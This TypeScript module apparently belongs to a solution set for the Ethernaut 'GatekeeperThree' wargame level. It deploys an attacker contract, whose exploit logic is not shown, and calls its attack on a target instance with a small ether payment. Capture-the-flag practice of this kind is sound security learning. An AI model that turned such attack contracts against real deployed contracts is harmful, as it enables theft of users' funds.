import { GatekeeperThreeAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const GATEKEEPER_THREE_LEVEL_NAME = "GatekeeperThree"

export const gatekeeperThreeAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Deploying attacker');
            const contract = await ethereum.deployContract<GatekeeperThreeAttack>('GatekeeperThreeAttack');

            console.log('Attacking with attacker deployed on: ', await contract.getAddress());

            const attackTx = await contract.attack(instanceAddress, { value: ethereum.parseEther('0.0011') });
            await attackTx.wait();
        }
    }
}
